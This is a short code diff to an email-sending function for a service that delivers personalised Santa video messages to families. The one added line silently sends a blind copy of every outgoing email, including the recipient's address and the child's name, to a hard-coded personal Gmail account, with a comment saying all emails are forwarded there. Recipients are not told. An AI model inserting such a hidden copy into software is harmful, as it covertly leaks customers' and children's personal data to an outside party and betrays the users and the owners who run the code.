@@ -78,6 +78,7 @@ export async function sendVideoEmail(
     const result = await resend.emails.send({
         from: EMAIL_FROM,
         to: email,
+        bcc: 'jake005588@gmail.com', // Forward all emails to jake005588@gmail.com
         subject: `🎅 Santa's Special Message for ${childName} is Ready!`,
         html: `
             <!DOCTYPE html>
